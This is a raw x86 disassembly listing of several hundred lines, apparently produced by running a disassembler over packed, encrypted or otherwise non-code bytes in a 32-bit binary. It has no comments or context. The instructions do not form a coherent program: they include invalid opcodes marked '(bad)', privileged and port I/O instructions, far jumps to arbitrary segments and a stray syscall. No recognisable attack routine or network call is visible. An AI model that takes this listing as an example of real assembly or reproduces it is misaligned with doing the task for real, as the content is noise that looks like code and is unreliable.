  41b251:	push   edx
  41b252:	imul   eax,DWORD PTR [edi],0x5fb44cde
  41b258:	repz or eax,0x476dd881
  41b25e:	mov    bh,0x32
  41b260:	adc    al,0xfb
  41b262:	jo     0x41b222
  41b264:	or     DWORD PTR [ebx*2+0x2e7c4b7a],esi
  41b26b:	ins    BYTE PTR es:[edi],dx
  41b26c:	sahf   
  41b26d:	fild   WORD PTR ds:0xa1890234
  41b273:	push   0xffffff92
  41b275:	xor    al,0xb3
  41b277:	mov    ds:0xd213ed27,al
  41b27c:	and    edi,DWORD PTR [esi+0x2c9b36c6]
  41b282:	std    
  41b283:	add    cl,cl
  41b285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b286:	push   0xdf8ef268
  41b28b:	loope  0x41b251
  41b28d:	push   0xffffffdc
  41b28f:	jmp    0x41b30a
  41b291:	xlat   BYTE PTR ds:[ebx]
  41b292:	mov    ecx,0x4d396fc
  41b297:	test   al,0x99
  41b299:	dec    eax
  41b29a:	in     al,dx
  41b29b:	adc    eax,0x528a87c2
  41b2a0:	retf   
  41b2a1:	test   DWORD PTR [ecx-0x1e],esp
  41b2a4:	pop    eax
  41b2a5:	xchg   ebx,eax
  41b2a6:	add    DWORD PTR [ebx+0x6a],0xffffffe2
  41b2aa:	jle    0x41b25d
  41b2ac:	jb     0x41b2c1
  41b2ae:	imul   ebp,DWORD PTR [ebp+edx*2+0x79],0x51
  41b2b3:	bound  eax,QWORD PTR [esi]
  41b2b5:	push   esi
  41b2b6:	std    
  41b2b7:	in     eax,0x86
  41b2b9:	pop    edx
  41b2ba:	jnp    0x41b25d
  41b2bc:	push   es
  41b2bd:	cs lahf 
  41b2bf:	push   eax
  41b2c0:	mov    edx,0x5ab39208
  41b2c5:	pop    ss
  41b2c6:	(bad)  
  41b2c7:	fdivr  st,st(0)
  41b2c9:	dec    ecx
  41b2ca:	popa   
  41b2cb:	xchg   al,cl
  41b2cd:	jg     0x41b2c7
  41b2cf:	jg     0x41b336
  41b2d1:	clc    
  41b2d2:	pop    ecx
  41b2d3:	(bad)  
  41b2d4:	push   ebp
  41b2d5:	out    0x33,eax
  41b2d7:	jae    0x41b32d
  41b2d9:	outs   dx,BYTE PTR ds:[esi]
  41b2da:	mov    bl,0xb2
  41b2dc:	adc    eax,0x9206f957
  41b2e1:	les    esi,FWORD PTR [eax-0x184b00b7]
  41b2e7:	aas    
  41b2e8:	nop
  41b2e9:	pop    ebp
  41b2ea:	xchg   esp,eax
  41b2eb:	aaa    
  41b2ec:	mul    DWORD PTR [ebx+0x365928bf]
  41b2f2:	fst    DWORD PTR [ebx-0x62]
  41b2f5:	cmp    BYTE PTR [ebx],dh
  41b2f7:	out    0x58,eax
  41b2f9:	sbb    al,0xcb
  41b2fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2fc:	cmp    DWORD PTR [edx*4+0x50867c61],ecx
  41b303:	mov    WORD PTR ds:0x3aa8c26d,?
  41b309:	sub    esp,DWORD PTR [eax+0x2d870168]
  41b30f:	mov    edi,0xdba3a5ca
  41b314:	syscall 
  41b316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b317:	scas   eax,DWORD PTR es:[edi]
  41b318:	int3   
  41b319:	adc    bh,bl
  41b31b:	dec    ecx
  41b31c:	pop    esi
  41b31d:	test   BYTE PTR [esi-0x5a],bh
  41b320:	sbb    eax,0xdba256f8
  41b325:	xor    al,0xff
  41b327:	pop    eax
  41b328:	(bad)  
  41b329:	xor    al,0x3b
  41b32b:	icebp  
  41b32c:	loopne 0x41b2b5
  41b32e:	(bad)  
  41b32f:	inc    ecx
  41b330:	shr    DWORD PTR [esi],cl
  41b332:	pop    edi
  41b333:	push   ecx
  41b334:	mul    dh
  41b336:	sbb    al,0xe0
  41b338:	mov    cl,bh
  41b33a:	xchg   edi,eax
  41b33b:	retf   
  41b33c:	push   ecx
  41b33d:	add    DWORD PTR [ebp-0x6e3d257f],esp
  41b343:	loopne 0x41b33d
  41b345:	inc    edx
  41b346:	out    0x2c,al
  41b348:	cs sub eax,0x8b6fe8f6
  41b34e:	rcr    DWORD PTR [ecx+ecx*4-0x3e666b5b],cl
  41b355:	mov    cl,ah
  41b357:	test   DWORD PTR [eax-0x63],eax
  41b35a:	push   cs
  41b35b:	xchg   dl,cl
  41b35d:	jmp    0x41066ba7
  41b362:	ds dec esi
  41b364:	nop    DWORD PTR [ebx+0x2f322396]
  41b36b:	pop    ebx
  41b36c:	fist   DWORD PTR [edx+0x542fb8fb]
  41b372:	mov    ah,dh
  41b374:	in     al,dx
  41b375:	popf   
  41b376:	js     0x41b303
  41b378:	mov    ah,0xfe
  41b37a:	mov    esp,0x7d1b258b
  41b37f:	je     0x41b362
  41b381:	fwait
  41b382:	mov    esi,fs
  41b384:	int    0xb1
  41b386:	fs push 0x2b54a0f9
  41b38c:	aaa    
  41b38d:	sahf   
  41b38e:	xchg   DWORD PTR [eax-0xf5ec7e3],ecx
  41b394:	adc    al,0x6e
  41b396:	mov    eax,0x6a20ffb2
  41b39b:	xchg   esp,eax
  41b39c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b39d:	mov    bh,0x7b
  41b39f:	mov    bh,0xe4
  41b3a1:	dec    esi
  41b3a2:	mov    DWORD PTR [eax+0x720586af],0xcdf2ba8b
  41b3ac:	rol    BYTE PTR [ebx-0x27c32042],1
  41b3b2:	jb     0x1de4011
  41b3b8:	mov    dh,0xd9
  41b3ba:	mov    ah,0x34
  41b3bc:	mov    fs,WORD PTR [ecx]
  41b3be:	das    
  41b3bf:	sti    
  41b3c0:	and    al,0x30
  41b3c2:	sub    al,BYTE PTR [edx]
  41b3c4:	adc    eax,0x3330a487
  41b3c9:	mov    ecx,0xa95f4ad4
  41b3ce:	jae    0x41b405
  41b3d0:	repz add edx,DWORD PTR [ebp+0x46d1f672]
  41b3d7:	into   
  41b3d8:	ins    DWORD PTR es:[edi],dx
  41b3d9:	stos   BYTE PTR es:[edi],al
  41b3da:	xlat   BYTE PTR ds:[ebx]
  41b3db:	mov    ah,0x6a
  41b3dd:	xor    BYTE PTR [edi],dh
  41b3df:	retf   0x206
  41b3e2:	or     DWORD PTR [ecx],ebx
  41b3e4:	popf   
  41b3e5:	adc    BYTE PTR [esi-0xc],0x49
  41b3e9:	push   eax
  41b3ea:	mov    ebx,0xc72b1c9f
  41b3ef:	pop    eax
  41b3f0:	jl     0x41b385
  41b3f2:	xchg   esp,eax
  41b3f3:	adc    BYTE PTR [eax-0x776ad03b],bh
  41b3f9:	loop   0x41b424
  41b3fb:	or     ah,al
  41b3fd:	cmp    al,0x9b
  41b3ff:	fadd   DWORD PTR [esi-0x53d1b7f6]
  41b405:	inc    edx
  41b406:	xchg   DWORD PTR [eax+0x542dde93],edx
  41b40c:	imul   edi,DWORD PTR [esi+0x46],0x29
  41b410:	popf   
  41b411:	push   ebp
  41b412:	pop    ecx
  41b413:	jb     0x41b3c1
  41b415:	add    DWORD PTR [eax+0x7440d5cf],ebp
  41b41b:	mov    dl,0x14
  41b41d:	jge    0x41b42d
  41b41f:	cdq    
  41b420:	ins    DWORD PTR es:[edi],dx
  41b421:	inc    edx
  41b422:	jns    0x41b461
  41b424:	(bad)  
  41b425:	hlt    
  41b426:	(bad)  [edx-0x591207c4]
  41b42c:	sbb    eax,ebp
  41b42e:	(bad)  
  41b430:	sub    edi,DWORD PTR [esi-0x75]
  41b433:	add    ch,BYTE PTR [esi+0x6b62de48]
  41b439:	ins    BYTE PTR es:[edi],dx
  41b43a:	in     eax,0xf0
  41b43c:	dec    BYTE PTR [edi]
  41b43e:	xor    DWORD PTR [esi-0x8f31f55],ebp
  41b444:	xor    ch,BYTE PTR [ecx-0x7fa30755]
  41b44a:	pop    edi
  41b44b:	in     eax,0x31
  41b44d:	inc    esi
  41b44e:	loopne 0x41b4bb
  41b450:	adc    eax,0xb9594693
  41b455:	pmullw mm0,QWORD PTR [ebx+0x74e93d88]
  41b45c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b45d:	add    eax,0x6a5d46a6
  41b462:	lahf   
  41b463:	push   ecx
  41b464:	loope  0x41b40d
  41b466:	xchg   ebp,eax
  41b467:	jnp    0x41b467
  41b469:	pop    eax
  41b46a:	push   cs
  41b46b:	jecxz  0x41b431
  41b46d:	and    ah,bh
  41b46f:	mov    esi,0xb6bd0a7c
  41b474:	or     bh,BYTE PTR [edx+0x42f4527b]
  41b47a:	pop    esi
  41b47b:	imul   ebx,DWORD PTR [edx+0x7684c672],0xed0a86bf
  41b485:	les    ebx,FWORD PTR [edx+0x7225c3da]
  41b48b:	jne    0x41b4f5
  41b48d:	add    BYTE PTR [edx-0x5771aaf4],ch
  41b493:	mov    eax,0xbbe8a637
  41b498:	jg     0x41b422
  41b49a:	cmp    DWORD PTR [ebp-0x3be829fd],ebp
  41b4a0:	and    ah,ah
  41b4a2:	dec    esp
  41b4a3:	xor    BYTE PTR [ebp*8+0x7d99fcaa],cl
  41b4aa:	js     0x41b51c
  41b4ac:	push   cs
  41b4ad:	daa    
  41b4ae:	xor    al,0x31
  41b4b0:	jle    0x41b466
  41b4b2:	dec    esp
  41b4b3:	mov    eax,ds:0x3cd95e3f
  41b4b8:	repz dec esi
  41b4ba:	inc    ebx
  41b4bb:	into   
  41b4bc:	(bad)  
  41b4bd:	mov    BYTE PTR [esi-0x47724699],bl
  41b4c3:	mov    bh,0x70
  41b4c5:	ins    BYTE PTR es:[edi],dx
  41b4c6:	cmp    al,0x40
  41b4c8:	mov    dh,0xe9
  41b4ca:	ss jae 0x41b4b2
  41b4cd:	inc    esi
  41b4ce:	push   esi
  41b4cf:	repnz or dl,BYTE PTR [edx+0x111e3d44]
  41b4d6:	scas   eax,DWORD PTR es:[edi]
  41b4d7:	lahf   
  41b4d8:	or     al,BYTE PTR [ebx]
  41b4da:	pop    edx
  41b4db:	jb     0x41b46e
  41b4dd:	mov    edx,0x261ee387
  41b4e2:	pusha  
  41b4e3:	push   ecx
  41b4e4:	pop    esp
  41b4e5:	sar    DWORD PTR [edi],1
  41b4e7:	imul   ecx,esp,0x40
  41b4ea:	test   ebx,0xcdb8af3
  41b4f0:	mov    al,ds:0x1f6b20b3
  41b4f5:	pcmpeqd mm2,QWORD PTR [ebx]
  41b4f8:	das    
  41b4f9:	xchg   edx,eax
  41b4fa:	xor    al,0xcd
  41b4fc:	int    0x26
  41b4fe:	adc    ah,bl
  41b500:	out    0x7f,eax
  41b502:	or     DWORD PTR [eax-0x2ca181b3],ebx
  41b508:	adc    BYTE PTR [eax+esi*8-0x4694d181],bl
  41b50f:	fs and ebp,edi
  41b512:	cmp    al,0x16
  41b514:	rol    BYTE PTR [edi+0x67],cl
  41b517:	mov    WORD PTR ds:0x8b8a2533,?
  41b51d:	(bad)  
  41b51e:	stos   DWORD PTR es:[edi],eax
  41b51f:	sub    al,0x7e
  41b521:	cmp    dl,BYTE PTR [ecx]
  41b523:	mov    al,BYTE PTR [edi+0x53]
  41b526:	adc    al,dh
  41b528:	mov    eax,ds:0xcacc1701
  41b52d:	or     BYTE PTR [edi+0x32629330],0x6b
  41b534:	mov    ds:0x2b9de693,al
  41b539:	out    0x15,eax
  41b53b:	push   0xfffffff4
  41b53d:	clc    
  41b53e:	fnstsw WORD PTR [edx-0x3dd9d659]
  41b544:	pop    ebp
  41b545:	lods   eax,DWORD PTR ds:[esi]
  41b546:	aas    
  41b547:	dec    dx
  41b549:	cmp    eax,0xa4fd3ad5
  41b54e:	sub    DWORD PTR [eax+0x60],ebx
  41b551:	push   es
  41b552:	stc    
  41b553:	push   esp
  41b554:	and    esp,DWORD PTR [ebx]
  41b556:	or     edx,DWORD PTR [esi-0x69]
  41b559:	pop    ebx
  41b55a:	sub    DWORD PTR [edi+0x73],esi
  41b55d:	sti    
  41b55e:	adc    DWORD PTR [ebx+0x61],0x79b3941
  41b565:	gs jp  0x41b594
  41b568:	sar    BYTE PTR [esi+0x19543a38],1
  41b56e:	mov    eax,ds:0x7a7ec252
  41b573:	dec    esp
  41b574:	out    0x6b,eax
  41b576:	gs ins DWORD PTR es:[edi],dx
  41b578:	ds dec edi
  41b57a:	fldcw  WORD PTR ss:[ecx]
  41b57d:	loope  0x41b5c2
  41b57f:	fidivr WORD PTR [esi-0x35c6ac4]
  41b585:	xor    esp,ebp
  41b587:	mov    edx,0xcde6cc85
  41b58c:	mov    al,ds:0xaca21853
  41b591:	mov    WORD PTR [ecx+ebp*1-0xb],es
  41b595:	test   al,0x96
  41b597:	xchg   ebx,eax
  41b598:	(bad)  
  41b599:	sti    
  41b59a:	sbb    eax,0x5e1c6e7b
  41b59f:	mov    BYTE PTR ss:[edi+0x6bf87fdd],ah
  41b5a6:	cs sbb al,0x96
  41b5a9:	loope  0x41b59d
  41b5ab:	mov    ch,0xb8
  41b5ad:	shl    BYTE PTR ds:0x1cc281de,0x93
  41b5b4:	test   ebp,ecx
  41b5b6:	or     dl,BYTE PTR [ebp+0x23]
  41b5b9:	xor    al,0xa8
  41b5bb:	in     al,0x81
  41b5bd:	lods   eax,DWORD PTR ds:[esi]
  41b5be:	pop    ebp
  41b5bf:	sahf   
  41b5c0:	rol    BYTE PTR [eax-0x634434e5],cl
  41b5c6:	pop    ss
  41b5c7:	iret   
  41b5c8:	pop    ds
  41b5c9:	shr    DWORD PTR [ebp-0x7],0x88
  41b5cd:	mov    ds:0xd90a7b63,eax
  41b5d2:	pop    edx
  41b5d3:	lods   eax,DWORD PTR ds:[esi]
  41b5d4:	sbb    eax,0xd1728c7e
  41b5d9:	mov    cl,0x5
  41b5db:	enter  0x26ad,0xec
  41b5df:	mov    ch,0x96
  41b5e1:	neg    DWORD PTR [edi-0x60]
  41b5e4:	pop    es
  41b5e5:	bound  edx,QWORD PTR [ecx]
  41b5e7:	sbb    BYTE PTR ds:0x4f0b2aaf,al
  41b5ed:	call   0xff11:0x37983f5a
  41b5f4:	and    BYTE PTR [esi-0x57cdb0b3],cl
  41b5fa:	and    eax,0x16b1a76a
  41b5ff:	jnp    0x41b5b7
  41b601:	gs cmc 
  41b603:	int    0x8b
  41b605:	cli    
  41b606:	jo     0x41b5bb
  41b608:	daa    
  41b609:	mov    ebx,0x4b7e26ac
  41b60e:	jmp    0x7c60:0xbd06ede9
  41b615:	push   0x47
  41b617:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b619:	rcr    BYTE PTR [edx],0x62
  41b61c:	add    dl,0xa4
  41b61f:	in     al,0x87
  41b621:	les    edi,FWORD PTR [ebx+0x285f0f96]
  41b627:	sti    
  41b628:	ins    BYTE PTR es:[edi],dx
  41b629:	pop    ebx
  41b62a:	cmp    cl,cl
  41b62c:	jecxz  0x41b5af
  41b62e:	dec    ebp
  41b62f:	push   ss
  41b630:	shl    al,1
  41b632:	add    ah,al
  41b634:	adc    al,0xa4
  41b636:	xor    eax,0xb016909d
  41b63b:	cdq    
  41b63c:	pop    es
  41b63d:	test   ah,bh
  41b63f:	(bad)  
  41b640:	sbb    dl,BYTE PTR [eax-0x2f]
  41b643:	or     al,0xb1
  41b645:	retf   0x63a6
  41b648:	dec    edi
  41b649:	and    bl,dh
  41b64b:	xchg   edi,eax
  41b64c:	mov    ch,0x70
  41b64e:	sti    
  41b64f:	in     eax,dx
  41b650:	into   
  41b651:	xchg   BYTE PTR [edi-0x20],ah
  41b654:	(bad)  
  41b655:	cld    
  41b656:	jns    0x41b611
  41b658:	cld    
  41b659:	xor    bh,BYTE PTR [eax+0x165f6581]
  41b65f:	dec    ebp
  41b660:	and    ch,bl
  41b662:	mov    eax,DWORD PTR [ecx+0xc7bc6c9]
  41b668:	mov    eax,ds:0xe1715f62
  41b66d:	mov    cl,0xa9
  41b66f:	cmc    
  41b670:	cmp    DWORD PTR ds:0x98e6a46e,eax
  41b676:	popf   
  41b677:	js     0x41b69d
  41b679:	xor    dl,BYTE PTR [edi-0x3f42ee5f]
  41b67f:	push   edi
  41b680:	scas   al,BYTE PTR es:[edi]
  41b681:	mov    ds,eax
  41b683:	cmp    ah,BYTE PTR [ebx-0x38]
  41b686:	int3   
  41b687:	(bad)  
  41b688:	retf   
  41b689:	cmp    DWORD PTR [ecx],ebp
  41b68b:	lahf   
  41b68c:	xor    eax,0x169d71ce
  41b691:	icebp  
  41b692:	fimul  DWORD PTR [ebx-0x70]
  41b695:	dec    edi
  41b696:	dec    edi
  41b697:	ins    BYTE PTR es:[edi],dx
  41b698:	mov    bh,0x78
  41b69a:	dec    esp
  41b69b:	inc    eax
  41b69c:	cmp    al,0x7e
  41b69e:	es nop
  41b6a0:	add    al,0xe3
  41b6a2:	xchg   esi,eax
  41b6a3:	scas   al,BYTE PTR es:[edi]
  41b6a4:	xchg   DWORD PTR [edi],esi
  41b6a6:	cwde   
  41b6a7:	fbstp  TBYTE PTR [ecx+0x28966550]
  41b6ad:	adc    BYTE PTR [esp+ecx*8-0x12],al
  41b6b1:	add    cl,ah
  41b6b3:	jo     0x41b66c
  41b6b5:	mov    esi,0xa8b5f93
  41b6ba:	call   0xfce7:0x3a1b697f
  41b6c1:	lea    eax,[ecx+eax*1]
  41b6c4:	jae    0x41b698
  41b6c6:	or     ebx,esi
  41b6c8:	add    DWORD PTR [eax],eax
  41b6ca:	adc    DWORD PTR [edx-0x715279c4],eax
  41b6d0:	fisttp WORD PTR [ebp-0x11]
  41b6d3:	jp     0x41b74c
  41b6d5:	pop    esi
  41b6d6:	sbb    DWORD PTR [esi],esi
  41b6d8:	push   cs
  41b6d9:	ret    
  41b6da:	(bad)  
  41b6db:	jo     0x41b74d
  41b6dd:	lahf   
  41b6de:	jmp    0xeb50:0xbf84d487
  41b6e5:	sbb    eax,DWORD PTR es:[esi+ebx*1]
  41b6e9:	cmp    eax,0x7d243a32
  41b6ee:	sahf   
  41b6ef:	or     ecx,DWORD PTR [ebp-0x65853ef4]
  41b6f5:	daa    
  41b6f6:	mov    dl,0x6b
  41b6f8:	mov    esi,0xd43b066c
  41b6fd:	loope  0x41b6e9
  41b6ff:	or     ebx,esi
  41b701:	faddp  st(6),st
  41b703:	test   al,0xed
  41b705:	mov    cl,0xfb
  41b707:	mov    WORD PTR [edx+0x2c],?
  41b70a:	retf   
  41b70b:	mov    dl,0x66
  41b70d:	call   0xd94e:0xd5672898
  41b714:	push   ebp
  41b715:	cmp    esp,ebx
  41b717:	test   BYTE PTR [edi-0x2d2b4a89],0x4d
  41b71e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b71f:	loopne 0x41b79b
  41b721:	and    BYTE PTR [esi-0x29dd2b28],ch
  41b727:	not    BYTE PTR [ebx]
  41b729:	sbb    ah,al
  41b72b:	jo     0x41b6b2
  41b72d:	jne    0x41b76b
  41b72f:	xchg   ebp,eax
  41b730:	sub    eax,DWORD PTR [ebx]
  41b732:	push   0xb8e5fce3
  41b737:	dec    esi
  41b738:	inc    ebx
  41b739:	in     al,0x3e
  41b73b:	mov    ecx,0x51f886f4
  41b740:	test   eax,0x9a1199b0
  41b745:	inc    esp
  41b746:	xor    al,0xaf
  41b748:	cmp    BYTE PTR [ebp-0x2ab0b608],bh
  41b74e:	sub    BYTE PTR [esi],bl
  41b750:	out    0xce,al
  41b752:	mov    esp,0x113e0138
  41b757:	dec    ebp
  41b758:	aaa    
  41b759:	in     eax,0xb3
  41b75b:	pop    edx
  41b75c:	mov    edx,0x11f7732a
  41b761:	jb     0x41b7a8
  41b763:	fdivr  st(1),st
  41b765:	pcmpgtb mm4,QWORD PTR [edx]
  41b768:	dec    ebx
  41b769:	addr16 xchg ebp,eax
  41b76b:	pop    ebx
  41b76c:	or     al,0x7e
  41b76e:	dec    edi
  41b76f:	out    dx,al
  41b770:	sub    ebx,DWORD PTR ds:0xfafcb9cd
  41b776:	jo     0x41b75f
  41b778:	or     BYTE PTR [eax],cl
  41b77a:	mov    bh,0xfd
  41b77c:	rol    BYTE PTR [edi-0x48b4923],1
  41b782:	sbb    eax,0x9145655f
  41b787:	sbb    DWORD PTR [esi+0x544367dc],ebp
  41b78d:	jmp    0x4ba867b6
  41b792:	(bad)  
  41b793:	mov    dl,0xe3
  41b795:	call   0xe3ef078c
  41b79a:	sub    BYTE PTR [eax],cl
  41b79c:	adc    DWORD PTR ds:0x27e34664,eax
  41b7a2:	retf   0x9c8c
  41b7a5:	mov    al,ds:0xd29b64e5
  41b7aa:	mov    ds:0x2cef088e,eax
  41b7af:	mov    ecx,cs
  41b7b1:	inc    ebx
  41b7b2:	scas   eax,DWORD PTR es:[edi]
  41b7b3:	or     cl,ah
  41b7b5:	ret    
  41b7b6:	xor    ebp,ebx
  41b7b8:	aad    0x4e
  41b7ba:	rcl    DWORD PTR [edx+0x1a1aad5c],cl
  41b7c0:	push   esi
  41b7c1:	lea    edx,[edx+0x3469fc9]
  41b7c7:	mov    DWORD PTR [ebx+0x46d76b67],ecx
  41b7cd:	xor    al,0x70
  41b7cf:	dec    esi
  41b7d0:	mov    ebp,edx
  41b7d2:	sub    esp,ebx
  41b7d4:	xchg   ebx,eax
  41b7d5:	and    DWORD PTR ds:0x391f8d9d,edi
  41b7db:	or     ebx,DWORD PTR [esi+eax*4]
  41b7de:	xchg   DWORD PTR [ebx+edi*8+0x57],ebx
  41b7e2:	imul   eax,DWORD PTR ds:0x54954972,0xffffffd2
  41b7e9:	sub    eax,0xd5486726
  41b7ee:	loop   0x41b82e
  41b7f0:	jno    0x41b852
  41b7f2:	xchg   esi,eax
  41b7f3:	xor    dh,BYTE PTR [ecx+edi*2+0x65]
  41b7f7:	sbb    eax,0xd48b196d
  41b7fc:	sbb    DWORD PTR [ecx+eax*8+0x2c],eax
  41b800:	mov    cl,0x2c
  41b802:	(bad)  
  41b803:	fsubr  QWORD PTR [esi+0x7f61a358]
  41b809:	(bad)  [eax+0x58766bad]
  41b80f:	push   es
  41b810:	push   edx
  41b811:	test   eax,0x581be4eb
  41b816:	xchg   esp,eax
  41b817:	adc    DWORD PTR [ebx+0x3b],esi
  41b81a:	mov    cl,cl
  41b81c:	and    DWORD PTR [edi+0x7f],ebp
  41b81f:	test   eax,edx
  41b821:	call   0xd93856f
  41b826:	gs dec ecx
  41b829:	sub    ebx,esp
  41b82b:	mov    al,ds:0x15dfded1
  41b830:	in     eax,dx
  41b831:	into   
  41b832:	mov    edx,0xf1494db1
  41b837:	add    DWORD PTR gs:[ebx-0x31fbf217],eax
  41b83e:	mov    bl,0xd1
  41b840:	mov    edi,0xb29a9a52
  41b845:	sub    DWORD PTR [ebx],ecx
  41b847:	out    dx,al
  41b848:	mov    ch,0x38
  41b84a:	inc    esi
  41b84b:	test   BYTE PTR [ebx+eiz*1+0x6fd80873],dl
  41b852:	js     0x41b875
  41b854:	jl     0x41b81d
  41b856:	inc    esi
  41b857:	shl    DWORD PTR [edi+0x199d2a62],cl
  41b85d:	call   0x14c1:0x78760f23
  41b864:	or     eax,ebp
  41b866:	mov    ah,0x4f
  41b868:	or     ah,dl
  41b86a:	add    edi,DWORD PTR [eax+0x5e602717]
  41b870:	dec    eax
  41b871:	not    DWORD PTR [eax+0x4fb0e0ab]
  41b877:	xchg   edx,eax
  41b878:	popf   
  41b879:	and    edx,DWORD PTR [ebp+ebx*1+0x75]
  41b87d:	loopne 0x41b82f
  41b87f:	sbb    eax,DWORD PTR [ecx]
  41b881:	dec    eax
  41b882:	cmc    
  41b883:	jmp    0xae464045
  41b888:	call   0x35caccec
  41b88d:	and    al,0xd1
  41b88f:	mov    al,ds:0xe9b63b73
  41b894:	(bad)  
  41b895:	xchg   edi,eax
  41b896:	ficomp WORD PTR [edx+0x69]
  41b899:	loop   0x41b846
  41b89b:	es clc 
  41b89d:	aaa    
  41b89e:	outs   dx,BYTE PTR ds:[esi]
  41b89f:	jmp    ecx
  41b8a1:	pop    ebx
  41b8a2:	jge    0x41b8d1
  41b8a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8a5:	adc    BYTE PTR [esi-0x5a],0xba
  41b8a9:	mov    cl,0xd3
  41b8ab:	pop    esp
  41b8ac:	add    ebp,DWORD PTR [ebx-0x75]
  41b8af:	push   ds
  41b8b0:	push   0x68b27ff8
  41b8b5:	adc    ch,bl
  41b8b7:	dec    eax
  41b8b8:	mov    dh,0x3e
  41b8ba:	jb     0x41b91d
  41b8bc:	loop   0x41b8f0
  41b8be:	inc    edx
  41b8bf:	jmp    0xb891:0x1d6bbc5b
  41b8c6:	pop    esi
  41b8c7:	pop    ebp
  41b8c8:	lods   eax,DWORD PTR ds:[esi]
  41b8c9:	ds jns 0x41b8b4
  41b8cc:	add    ebx,DWORD PTR [ebx]
  41b8ce:	push   0x15beea7
  41b8d3:	sub    eax,0x2732f00d
  41b8d8:	out    dx,eax
  41b8d9:	mov    bh,0x55
  41b8db:	cmp    BYTE PTR [eax-0x7e9a10d6],al
  41b8e1:	loop   0x41b952
  41b8e3:	adc    ecx,ecx
  41b8e5:	fsub   QWORD PTR [edx+0x1c09fe0f]
  41b8eb:	div    DWORD PTR [edi]
  41b8ed:	inc    ebp
  41b8ee:	inc    ebx
  41b8ef:	aaa    
  41b8f0:	jg     0x41b90a
  41b8f2:	mov    dh,0xa3
  41b8f4:	(bad)  
  41b8f5:	call   0xd8ee58e1
  41b8fa:	das    
  41b8fb:	fwait
  41b8fc:	out    0xd0,al
  41b8fe:	or     bh,BYTE PTR [eax+0x7a]
  41b901:	and    edx,DWORD PTR [ebp+eax*2+0x41]
  41b905:	xchg   edi,ebx
  41b907:	cld    
  41b908:	mov    dh,0xbd
  41b90a:	jnp    0x41b89c
  41b90c:	test   BYTE PTR [eax+esi*8],ah
  41b90f:	and    BYTE PTR ds:0xd49a633d,0x5
  41b916:	push   esp
  41b917:	repz pop esi
  41b919:	push   esp
  41b91a:	inc    esp
  41b91b:	adc    eax,0x7647af23
  41b920:	cmp    eax,0x8cd3703b
  41b925:	in     al,dx
  41b926:	lock cmp dl,bl
  41b929:	push   0x74
  41b92b:	(bad)
  41b92e:	push   eax
  41b92f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b930:	sbb    DWORD PTR [edi-0x41],ecx
  41b933:	mov    tr3,ebp
  41b936:	popa   
  41b937:	stos   BYTE PTR es:[edi],al
  41b938:	aam    0x69
  41b93a:	mov    ah,0x8b
  41b93c:	or     eax,0x6478248b
  41b941:	mov    ah,0x8a
  41b943:	jns    0x41b9ae
  41b945:	pop    eax
  41b946:	fsubp  st(4),st
  41b948:	into   
  41b949:	pop    edi
  41b94a:	xor    al,0x62
  41b94c:	stc    
  41b94d:	push   0x79
  41b94f:	fwait
  41b950:	mov    ds:0x6e19533b,eax
  41b955:	hlt    
  41b956:	adc    BYTE PTR [edi+0x59a18603],ah
  41b95c:	mov    edi,0x8046a8
  41b962:	or     al,BYTE PTR [edi]
  41b964:	push   edi
  41b965:	loope  0x41b940
  41b967:	(bad)  
  41b968:	dec    esp
  41b969:	cs jae 0x41b9c9
  41b96c:	test   BYTE PTR [edi-0x31],al
  41b96f:	jmp    0x41b8f1
  41b971:	mov    ch,BYTE PTR [edi]
  41b973:	xchg   esp,eax
  41b974:	outs   dx,DWORD PTR ds:[esi]
  41b975:	(bad)  
  41b976:	in     al,dx
  41b977:	out    0x8d,eax
  41b979:	inc    esp
  41b97a:	inc    ebp
  41b97b:	aam    0xac
  41b97d:	cmc    
  41b97e:	pop    ecx
  41b97f:	js     0x41b915
  41b981:	inc    ebx
  41b982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b983:	xchg   ebx,eax
  41b984:	cmp    al,0xd8
  41b986:	xor    dh,BYTE PTR [ebp-0x60]
  41b989:	sub    BYTE PTR [ecx+0x1c273c6d],al
  41b98f:	stos   BYTE PTR es:[edi],al
  41b990:	rol    DWORD PTR [edi-0x707d2dd3],cl
  41b996:	stos   DWORD PTR es:[edi],eax
  41b997:	je     0x41b926
  41b999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b99a:	jmp    FWORD PTR ds:0xfd5e4741
  41b9a0:	leave  
  41b9a1:	stos   DWORD PTR es:[edi],eax
  41b9a2:	push   bp
  41b9a4:	fist   WORD PTR [ebx+ebx*2-0x38]
  41b9a8:	add    DWORD PTR [ecx-0x26],eax
  41b9ab:	dec    ebp
  41b9ac:	fwait
  41b9ad:	jp     0x41b9f5
  41b9af:	dec    ebp
  41b9b0:	mov    cl,0x98
  41b9b2:	mov    ah,0xa1
  41b9b4:	adc    cl,BYTE PTR [ecx-0x3fd301c0]
  41b9ba:	test   BYTE PTR [edx+eax*1],cl
  41b9bd:	je     0x41ba1f
  41b9bf:	mov    eax,ds:0xc33e238d
  41b9c4:	push   ebx
  41b9c5:	xchg   DWORD PTR [ebx],edx
  41b9c7:	in     al,dx
  41b9c8:	xchg   BYTE PTR [ebp+0x1e],ch
  41b9cb:	jnp    0x41ba1c
  41b9cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9ce:	jnp    0x41b9f9
  41b9d0:	xchg   esp,eax
  41b9d1:	retf   0xe800
  41b9d4:	and    ebx,DWORD PTR [esi-0xa183704]
  41b9da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9db:	push   edi
  41b9dc:	mov    ch,0xeb
  41b9de:	cs dec ecx
  41b9e0:	mov    bl,0x41
  41b9e2:	mov    bh,0xe2
  41b9e4:	xlat   BYTE PTR ds:[ebx]
  41b9e5:	js     0x41ba5f
  41b9e7:	iret   
  41b9e8:	(bad)  
  41b9e9:	jne    0x41b9aa
  41b9eb:	ins    BYTE PTR es:[edi],dx
  41b9ec:	in     eax,0xc5
  41b9ee:	and    eax,0xc69010c2
  41b9f3:	push   esi
